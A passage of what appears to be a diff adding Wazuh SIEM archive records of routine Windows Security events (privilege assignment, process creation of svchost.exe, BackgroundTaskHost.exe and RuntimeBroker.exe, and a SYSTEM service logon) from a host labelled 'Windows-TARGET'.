+                                "privilegeList": "SeAssignPrimaryTokenPrivilege     SeTcbPrivilege     SeSecurityPrivilege     SeTakeOwnershipPrivilege     SeLoadDriverPrivilege     SeBackupPrivilege     SeRestorePrivilege     SeDebugPrivilege     SeAuditPrivilege     SeSystemEnvironmentPrivilege     SeImpersonatePrivilege     SeDelegateSessionUserImpersonatePrivilege",
+                                "subjectUserName": "SYSTEM"
+                            },
+                            "system": {
+                                "eventID": "4672",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"Special privileges assigned to new logon.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tSYSTEM\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E7\r\n\r\nPrivileges:\t\tSeAssignPrimaryTokenPrivilege\r\n\t\t\tSeTcbPrivilege\r\n\t\t\tSeSecurityPrivilege\r\n\t\t\tSeTakeOwnershipPrivilege\r\n\t\t\tSeLoadDriverPrivilege\r\n\t\t\tSeBackupPrivilege\r\n\t\t\tSeRestorePrivilege\r\n\t\t\tSeDebugPrivilege\r\n\t\t\tSeAuditPrivilege\r\n\t\t\tSeSystemEnvironmentPrivilege\r\n\t\t\tSeImpersonatePrivilege\r\n\t\t\tSeDelegateSessionUserImpersonatePrivilege\"",
+                                "version": "0",
+                                "systemTime": "2026-05-12T16:25:19.7016567Z",
+                                "eventRecordID": "29659",
+                                "threadID": "4332",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "12548",
+                                "processID": "824",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4672\",\"version\":\"0\",\"level\":\"0\",\"task\":\"12548\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:25:19.7016567Z\",\"eventRecordID\":\"29659\",\"processID\":\"824\",\"threadID\":\"4332\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"Special privileges assigned to new logon.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tSYSTEM\\r\\n\\tAccount Domain:\\t\\tNT AUTHORITY\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\r\\nPrivileges:\\t\\tSeAssignPrimaryTokenPrivilege\\r\\n\\t\\t\\tSeTcbPrivilege\\r\\n\\t\\t\\tSeSecurityPrivilege\\r\\n\\t\\t\\tSeTakeOwnershipPrivilege\\r\\n\\t\\t\\tSeLoadDriverPrivilege\\r\\n\\t\\t\\tSeBackupPrivilege\\r\\n\\t\\t\\tSeRestorePrivilege\\r\\n\\t\\t\\tSeDebugPrivilege\\r\\n\\t\\t\\tSeAuditPrivilege\\r\\n\\t\\t\\tSeSystemEnvironmentPrivilege\\r\\n\\t\\t\\tSeImpersonatePrivilege\\r\\n\\t\\t\\tSeDelegateSessionUserImpersonatePrivilege\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-18\",\"subjectUserName\":\"SYSTEM\",\"subjectDomainName\":\"NT AUTHORITY\",\"subjectLogonId\":\"0x3e7\",\"privilegeList\":\"SeAssignPrimaryTokenPrivilege     SeTcbPrivilege     SeSecurityPrivilege     SeTakeOwnershipPrivilege     SeLoadDriverPrivilege     SeBackupPrivilege     SeRestorePrivilege     SeDebugPrivilege     SeAuditPrivilege     SeSystemEnvironmentPrivilege     SeImpersonatePrivilege     SeDelegateSessionUserImpersonatePrivilege\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:20.415Z",
+                    "location": "EventChannel",
+                    "id": "1778603120.3315385",
+                    "timestamp": "2026-05-12T16:25:20.415+0000"
+                },
+                "sort": [
+                    1778603120415
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "ghcBHZ4BTkZw-2444AOv",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x3e7",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\services.exe",
+                                "subjectDomainName": "WORKGROUP",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0x1c8c",
+                                "mandatoryLabel": "S-1-16-16384",
+                                "newProcessName": "C:\\\\Windows\\\\System32\\\\svchost.exe",
+                                "targetLogonId": "0x0",
+                                "subjectUserSid": "S-1-5-18",
+                                "processId": "0x324",
+                                "commandLine": "C:\\\\WINDOWS\\\\system32\\\\svchost.exe -k wusvcs -p -s WaaSMedicSvc",
+                                "targetUserSid": "S-1-0-0",
+                                "subjectUserName": "WIN-C1OEL3I2PV8$"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWIN-C1OEL3I2PV8$\r\n\tAccount Domain:\t\tWORKGROUP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0x1c8c\r\n\tNew Process Name:\tC:\\Windows\\System32\\svchost.exe\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-16384\r\n\tCreator Process ID:\t0x324\r\n\tCreator Process Name:\tC:\\Windows\\System32\\services.exe\r\n\tProcess Command Line:\tC:\\WINDOWS\\system32\\svchost.exe -k wusvcs -p -s WaaSMedicSvc\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:25:19.7030506Z",
+                                "eventRecordID": "29660",
+                                "threadID": "4228",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 103,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:25:19.7030506Z\",\"eventRecordID\":\"29660\",\"processID\":\"4\",\"threadID\":\"4228\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tWIN-C1OEL3I2PV8$\\r\\n\\tAccount Domain:\\t\\tWORKGROUP\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0x1c8c\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\svchost.exe\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-16384\\r\\n\\tCreator Process ID:\\t0x324\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\services.exe\\r\\n\\tProcess Command Line:\\tC:\\\\WINDOWS\\\\system32\\\\svchost.exe -k wusvcs -p -s WaaSMedicSvc\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-18\",\"subjectUserName\":\"WIN-C1OEL3I2PV8$\",\"subjectDomainName\":\"WORKGROUP\",\"subjectLogonId\":\"0x3e7\",\"newProcessId\":\"0x1c8c\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x324\",\"commandLine\":\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\svchost.exe -k wusvcs -p -s WaaSMedicSvc\",\"targetUserSid\":\"S-1-0-0\",\"targetLogonId\":\"0x0\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\services.exe\",\"mandatoryLabel\":\"S-1-16-16384\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:20.434Z",
+                    "location": "EventChannel",
+                    "id": "1778603120.3321323",
+                    "timestamp": "2026-05-12T16:25:20.434+0000"
+                },
+                "sort": [
+                    1778603120434
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "gxcBHZ4BTkZw-2444AOv",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x3e7",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\svchost.exe",
+                                "subjectDomainName": "WORKGROUP",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0x1de4",
+                                "mandatoryLabel": "S-1-16-4096",
+                                "newProcessName": "C:\\\\Windows\\\\System32\\\\backgroundTaskHost.exe",
+                                "targetLogonId": "0x670c2",
+                                "targetUserName": "AmineMSc",
+                                "subjectUserSid": "S-1-5-18",
+                                "processId": "0x3bc",
+                                "targetDomainName": "WIN-C1OEL3I2PV8",
+                                "commandLine": "\\\"C:\\\\WINDOWS\\\\system32\\\\BackgroundTaskHost.exe\\\" -ServerName:BackgroundTaskHost.WebAccountProvider",
+                                "targetUserSid": "S-1-5-21-3827095766-909782368-2839298323-1001",
+                                "subjectUserName": "WIN-C1OEL3I2PV8$"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWIN-C1OEL3I2PV8$\r\n\tAccount Domain:\t\tWORKGROUP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-5-21-3827095766-909782368-2839298323-1001\r\n\tAccount Name:\t\tAmineMSc\r\n\tAccount Domain:\t\tWIN-C1OEL3I2PV8\r\n\tLogon ID:\t\t0x670C2\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0x1de4\r\n\tNew Process Name:\tC:\\Windows\\System32\\backgroundTaskHost.exe\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-4096\r\n\tCreator Process ID:\t0x3bc\r\n\tCreator Process Name:\tC:\\Windows\\System32\\svchost.exe\r\n\tProcess Command Line:\t\"C:\\WINDOWS\\system32\\BackgroundTaskHost.exe\" -ServerName:BackgroundTaskHost.WebAccountProvider\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:25:19.8548754Z",
+                                "eventRecordID": "29661",
+                                "threadID": "9624",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 104,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:25:19.8548754Z\",\"eventRecordID\":\"29661\",\"processID\":\"4\",\"threadID\":\"9624\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tWIN-C1OEL3I2PV8$\\r\\n\\tAccount Domain:\\t\\tWORKGROUP\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-3827095766-909782368-2839298323-1001\\r\\n\\tAccount Name:\\t\\tAmineMSc\\r\\n\\tAccount Domain:\\t\\tWIN-C1OEL3I2PV8\\r\\n\\tLogon ID:\\t\\t0x670C2\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0x1de4\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\backgroundTaskHost.exe\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-4096\\r\\n\\tCreator Process ID:\\t0x3bc\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\svchost.exe\\r\\n\\tProcess Command Line:\\t\\\"C:\\\\WINDOWS\\\\system32\\\\BackgroundTaskHost.exe\\\" -ServerName:BackgroundTaskHost.WebAccountProvider\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-18\",\"subjectUserName\":\"WIN-C1OEL3I2PV8$\",\"subjectDomainName\":\"WORKGROUP\",\"subjectLogonId\":\"0x3e7\",\"newProcessId\":\"0x1de4\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\backgroundTaskHost.exe\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x3bc\",\"commandLine\":\"\\\\\\\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\BackgroundTaskHost.exe\\\\\\\" -ServerName:BackgroundTaskHost.WebAccountProvider\",\"targetUserSid\":\"S-1-5-21-3827095766-909782368-2839298323-1001\",\"targetUserName\":\"AmineMSc\",\"targetDomainName\":\"WIN-C1OEL3I2PV8\",\"targetLogonId\":\"0x670c2\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\",\"mandatoryLabel\":\"S-1-16-4096\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:20.453Z",
+                    "location": "EventChannel",
+                    "id": "1778603120.3327037",
+                    "timestamp": "2026-05-12T16:25:20.453+0000"
+                },
+                "sort": [
+                    1778603120453
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "hBcBHZ4BTkZw-2444AOv",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x3e7",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\svchost.exe",
+                                "subjectDomainName": "WORKGROUP",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0x1974",
+                                "mandatoryLabel": "S-1-16-12288",
+                                "newProcessName": "C:\\\\Windows\\\\System32\\\\RuntimeBroker.exe",
+                                "targetLogonId": "0x670c2",
+                                "targetUserName": "AmineMSc",
+                                "subjectUserSid": "S-1-5-18",
+                                "processId": "0x3bc",
+                                "targetDomainName": "WIN-C1OEL3I2PV8",
+                                "commandLine": "C:\\\\Windows\\\\System32\\\\RuntimeBroker.exe -Embedding",
+                                "targetUserSid": "S-1-5-21-3827095766-909782368-2839298323-1001",
+                                "subjectUserName": "WIN-C1OEL3I2PV8$"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWIN-C1OEL3I2PV8$\r\n\tAccount Domain:\t\tWORKGROUP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-5-21-3827095766-909782368-2839298323-1001\r\n\tAccount Name:\t\tAmineMSc\r\n\tAccount Domain:\t\tWIN-C1OEL3I2PV8\r\n\tLogon ID:\t\t0x670C2\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0x1974\r\n\tNew Process Name:\tC:\\Windows\\System32\\RuntimeBroker.exe\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-12288\r\n\tCreator Process ID:\t0x3bc\r\n\tCreator Process Name:\tC:\\Windows\\System32\\svchost.exe\r\n\tProcess Command Line:\tC:\\Windows\\System32\\RuntimeBroker.exe -Embedding\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:25:19.9067900Z",
+                                "eventRecordID": "29662",
+                                "threadID": "9504",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 105,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:25:19.9067900Z\",\"eventRecordID\":\"29662\",\"processID\":\"4\",\"threadID\":\"9504\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tWIN-C1OEL3I2PV8$\\r\\n\\tAccount Domain:\\t\\tWORKGROUP\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-3827095766-909782368-2839298323-1001\\r\\n\\tAccount Name:\\t\\tAmineMSc\\r\\n\\tAccount Domain:\\t\\tWIN-C1OEL3I2PV8\\r\\n\\tLogon ID:\\t\\t0x670C2\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0x1974\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\RuntimeBroker.exe\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-12288\\r\\n\\tCreator Process ID:\\t0x3bc\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\svchost.exe\\r\\n\\tProcess Command Line:\\tC:\\\\Windows\\\\System32\\\\RuntimeBroker.exe -Embedding\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-18\",\"subjectUserName\":\"WIN-C1OEL3I2PV8$\",\"subjectDomainName\":\"WORKGROUP\",\"subjectLogonId\":\"0x3e7\",\"newProcessId\":\"0x1974\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\RuntimeBroker.exe\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x3bc\",\"commandLine\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\RuntimeBroker.exe -Embedding\",\"targetUserSid\":\"S-1-5-21-3827095766-909782368-2839298323-1001\",\"targetUserName\":\"AmineMSc\",\"targetDomainName\":\"WIN-C1OEL3I2PV8\",\"targetLogonId\":\"0x670c2\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\",\"mandatoryLabel\":\"S-1-16-12288\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:25:20.469Z",
+                    "location": "EventChannel",
+                    "id": "1778603120.3333295",
+                    "timestamp": "2026-05-12T16:25:20.469+0000"
+                },
+                "sort": [
+                    1778603120469
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "hRcBHZ4BTkZw-2445AOX",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x3e7",
+                                "subjectDomainName": "WORKGROUP",
+                                "targetLinkedLogonId": "0x0",
+                                "impersonationLevel": "%%1833",
+                                "authenticationPackageName": "Negotiate",
+                                "targetLogonId": "0x3e7",
+                                "logonProcessName": "Advapi",
+                                "logonGuid": "{00000000-0000-0000-0000-000000000000}",
+                                "targetUserName": "SYSTEM",
+                                "keyLength": "0",
+                                "elevatedToken": "%%1842",
+                                "subjectUserSid": "S-1-5-18",
+                                "processId": "0x324",
+                                "processName": "C:\\\\Windows\\\\System32\\\\services.exe",
+                                "targetDomainName": "NT AUTHORITY",
+                                "targetUserSid": "S-1-5-18",
+                                "virtualAccount": "%%1843",
+                                "logonType": "5",
+                                "subjectUserName": "WIN-C1OEL3I2PV8$"
+                            },
+                            "system": {
+                                "eventID": "4624",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"An account was successfully logged on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWIN-C1OEL3I2PV8$\r\n\tAccount Domain:\t\tWORKGROUP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nLogon Information:\r\n\tLogon Type:\t\t5\r\n\tRestricted Admin Mode:\t-\r\n\tRemote Credential Guard:\t-\r\n\tVirtual Account:\t\tNo\r\n\tElevated Token:\t\tYes\r\n\r\nImpersonation Level:\t\tImpersonation\r\n\r\nNew Logon:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tSYSTEM\r\n\tAccount Domain:\t\tNT AUTHORITY\r\n\tLogon ID:\t\t0x3E7\r\n\tLinked Logon ID:\t\t0x0\r\n\tNetwork Account Name:\t-\r\n\tNetwork Account Domain:\t-\r\n\tLogon GUID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x324\r\n\tProcess Name:\t\tC:\\Windows\\System32\\services.exe\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\t-\r\n\tSource Network Address:\t-\r\n\tSource Port:\t\t-\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tAdvapi  \r\n\tAuthentication Package:\tNegotiate\r\n\tTransited Services:\t-\r\n\tPackage Name (NTLM only):\t-\r\n\tKey Length:\t\t0\r\n\r\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\r\n\r\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\r\n\r\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\r\n\r\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\r\n\r\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\r\n\r\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\r\n\r\nThe authentication information fields provide detailed information about this specific logon request.\r\n\t- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\r\n\t- Transited services indicate which intermediate services have participated in this logon request.\r\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\r\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\"",
+                                "version": "3",
